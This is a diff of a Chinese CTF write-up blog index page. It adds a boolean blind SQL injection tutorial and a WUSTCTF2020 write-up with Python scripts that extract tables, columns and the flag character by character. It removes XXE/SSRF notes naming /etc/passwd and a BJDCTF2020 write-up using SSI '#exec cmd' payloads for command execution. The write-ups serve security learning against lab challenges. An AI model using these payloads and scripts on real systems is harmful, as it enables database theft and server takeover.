@@ -71,6 +71,112 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-92" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/06/page-92/" class="article-date">
+  <time class="dt-published" datetime="2021-08-06T03:58:41.000Z" itemprop="datePublished">2021-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/06/page-92/">布尔盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>盲注就是在页面无提供回显时的一种继续注入手段<br><strong>布尔型就是输入and 1 或者and 0 浏览器返回两个不同页面可以根据返回的页面来判断正确的数据信息</strong><br><strong>相关函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">length()</span><br><span class="line">返回字符串的长度，以字节为单位，一个多字节字符算作多字节 就是假设一个包含3个双字节字符的字符串length()返回6 che_length() 返回3</span><br><span class="line">substr() </span><br><span class="line">从指定位置返回多少个字符 substr() 有三个参数 </span><br><span class="line">substr(字符串，从第几位开始，截取多长）</span><br><span class="line">mid也具有相似的功能用法一致</span><br><span class="line">ascii()</span><br><span class="line">输出某个字符的ascii码值 只能处理单个字符 字符串的话只能是第一个字符 配合substr使用效果很好</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/135.PNG?raw=true" alt="135.PNG"></p>
+<p>select ascii(substr(database(),1,1))&gt;114#    这边&gt;114可以改大于小于等于 114也可以改<br>我这边数据库是security</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/137.PNG?raw=true" alt="137.PNG"></p>
+<p>那么大于115就返回空 那么第一个字符就是ascii码为115的字符</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/138.PNG?raw=true" alt="138.PNG"></p>
+<p>接下去就可以从第二位</p>
+<p>select (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100查表</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/139.PNG?raw=true" alt="139.PNG"></p>
+<p>select (ascii(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)))&gt;100查列</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/06/page-92/" data-id="cksyl7wk6002bw4w7b6rxhhqm" data-title="布尔盲注" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-91" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/06/page-91/" class="article-date">
+  <time class="dt-published" datetime="2021-08-06T03:58:39.000Z" itemprop="datePublished">2021-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/06/page-91/">WUSTCTF2020颜值成绩查询</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首先题目说了查询那正常是sql注入<br>在搜索框输入1 2 3 4 页面均有变化其他的都没有<br>各种’ “ 之类的符号都没有什么回显</p>
+<p>试一下布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;1,1,0) </span><br><span class="line">有回显</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/133.PNG?raw=true" alt="133.PNG"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;3,1,0) </span><br><span class="line">无回显</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/134.PNG?raw=true" alt="134.PNG"></p>
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_+=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(table_name),&#123;&#125;,1))from/**/information_schema.tables/**/where/**/table_schema=database())=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(column_name),&#123;&#125;,1))from/**/information_schema.columns/**/where/**/table_schema=database())=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(value),&#123;&#125;,1))from/**/flag)=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/06/page-91/" data-id="cksyl7wk5002aw4w78ur8f31k" data-title="WUSTCTF2020颜值成绩查询" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-90" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/29/page-90/" class="article-date">
@@ -562,122 +668,6 @@
 
 
   
-    <article id="post-page-82" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/29/page-82/" class="article-date">
-  <time class="dt-published" datetime="2021-07-29T06:23:29.000Z" itemprop="datePublished">2021-07-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/29/page-82/">NCTF2019True XML cookbook</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>这边是xxe漏洞**<br> XXE ：Xml External Entity 外部实体注入攻击**<br>是利用一种xml的语言进行的注入攻击<br>构造假的xml语言进行注入攻击 <strong>之前[NCTF2019]fakeXMLcookbook也利用到xxe漏洞</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxe漏洞可以进行一堆的神奇操作</span><br><span class="line">读取系统文件 </span><br><span class="line">获取源代码</span><br><span class="line">进行ssrf</span><br><span class="line">进行Phar触发反序列化 </span><br></pre></td></tr></table></figure>
-
-<p>这题这边可以进行ssrf攻击探测内网主机<br>这边可以用file:// 或者php:// 等伪协议进行获取文件（获取代码最好用php://filter进行base64转码）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">读取一些配置文件 ：</span><br><span class="line">/etc/hosts 储存域名解析的缓存</span><br><span class="line">/etc/passwd 用户密码</span><br><span class="line">/proc/net/arp 每个网络接口的arp表中dev包</span><br><span class="line">/proc/net/arp 获取ip</span><br></pre></td></tr></table></figure>
-
-<p>然后 /etc/hosts发现内网地址</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/75.PNG?raw=true" alt="75.PNG"></p>
-<p>但是没有当前ip</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/76.PNG?raw=true" alt="76.PNG"></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/77.PNG?raw=true" alt="77.PNG"></p>
-<p>然后利用burp的爆破模块进行扫描内网主机然后在10.0.48.6拿到flag</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/78.PNG?raw=true" alt="78.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/29/page-82/" data-id="cksyl7wk20021w4w715dfhgwn" data-title="NCTF2019True XML cookbook" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-81" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/29/page-81/" class="article-date">
-  <time class="dt-published" datetime="2021-07-29T06:23:27.000Z" itemprop="datePublished">2021-07-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>老样子还是得扫后台扫到一个index.php.swp 进入后给了源码 重点是这部分</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br></pre></td></tr></table></figure>
-
-<p><strong>只要有一个密码前六位的MD5是6d0bc1 跑脚本：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a= <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> a:</span><br><span class="line">                        <span class="keyword">for</span> u <span class="keyword">in</span> a:</span><br><span class="line">                            b = <span class="built_in">str</span>(o)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(q)+<span class="built_in">str</span>(r)+<span class="built_in">str</span>(s)+<span class="built_in">str</span>(t)+<span class="built_in">str</span>(u)</span><br><span class="line">                            md5 = hashlib.md5(b.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                            <span class="keyword">if</span> ((md5[<span class="number">0</span>:<span class="number">6</span>])==<span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">                                <span class="built_in">print</span> b</span><br></pre></td></tr></table></figure>
-
-<p><strong>2020666</strong><br><strong>2305004</strong><br><strong>9162671</strong>  这仨结果随便选一个 <strong>username=2020666&amp;password=2020666</strong><br>然后抓包发现这边好像会写入一个.shtml 的文件可以访问</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/68.PNG?raw=true" alt="68.PNG"></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/69.PNG?raw=true" alt="69.PNG"></p>
-<p>百度了一下这边可以<strong>进行ssi注入</strong> </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/70.PNG?raw=true" alt="70.PNG"></p>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonelee/p/12027775.html">https://www.cnblogs.com/bonelee/p/12027775.html</a><br>可以进行远程命令执行  </p>
-<p>传个ls试试 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/67.PNG?raw=true" alt="67.PNG"></p>
-<p>可以访问到but该文件 flag不在这     </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/72.PNG?raw=true" alt="72.PNG"></p>
-<p>返回上一个目录 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;&amp;password=2020666  </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/74.PNG?raw=true" alt="74.PNG"></p>
-<p>看样子可以找到flag<br>传入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>
-
-<p> 访问生成的文件 ok</p>
-<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/73.PNG?raw=true" alt="73.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/29/page-81/" data-id="cksyl7wk1001zw4w731w9gkjc" data-title="BJDCTF2020EasySearch" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -701,7 +691,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -714,6 +704,14 @@
       <ul>
         
           <li>
+            <a href="/2021/09/09/page-115/">又是misc</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/page-114/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
@@ -723,14 +721,6 @@
         
           <li>
             <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
